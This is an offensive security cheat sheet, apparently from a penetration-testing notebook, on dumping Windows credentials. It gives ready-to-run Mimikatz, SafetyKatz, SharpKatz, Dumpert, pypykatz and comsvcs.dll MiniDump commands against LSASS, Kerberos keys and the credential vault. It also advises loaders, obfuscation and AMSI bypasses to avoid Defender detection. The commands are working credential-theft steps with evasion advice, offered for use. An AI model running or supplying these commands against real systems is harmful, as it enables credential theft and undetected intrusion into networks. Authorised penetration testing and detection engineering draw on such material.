# Credentials Dumping

## LSASS

{% hint style="warning" %}
High chances of detection. Always use the Loader.exe to use these. Otherwise, it will be detected by the defender.
{% endhint %}

Use [impacket ](https://github.com/fortra/impacket)if you are using a Linux machine as an attacker machine. Instead of Mimikatz a obfuscated version called **Invoke-Mimi.ps1**(inside _Tools_ folder) can be used too.

Some of the credentials can be extracted without touching **LSASS**:

* SAM Hive (Registry) - Local Admins (Try to avoid)
* LSA Secrets/Security Hive (Registry) - Service Account Passwords, Domain Cached Credentials (Maybe Detected)
* DPAPI Protected Credentials (Disk) - Credentials Manager/Vault, Browser Cookies, Certificates, Azure Tokens (Best for secops)

### Kerberos encryption keys

The Kerberos SSP used by LSASS in order to provide different authentication methods.\
Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.

<pre class="language-powershell"><code class="lang-powershell"><strong># Check tickets that can be dumpes
</strong>Rubeus.exe triage
<strong>
</strong><strong># Dump credentials on a local machine using Mimikatz.
</strong>Invoke-Mimikatz -Command '"sekurlsa::ekeys"' 

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
# Used evasive-keys to bypass ASMI and has been edited in the source code
SafetyKatz.exe "sekurlsa::evasive-keys" 

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
&#x3C;lsass process ID> C:\Users\Public\lsass.dmp full 
</code></pre>

### Logon Passwords

This usually shows recently logged on user and computer credentials.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
```

## Vault

Enumerates vault credentials of scheduled tasks.

```powershell
Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'
```
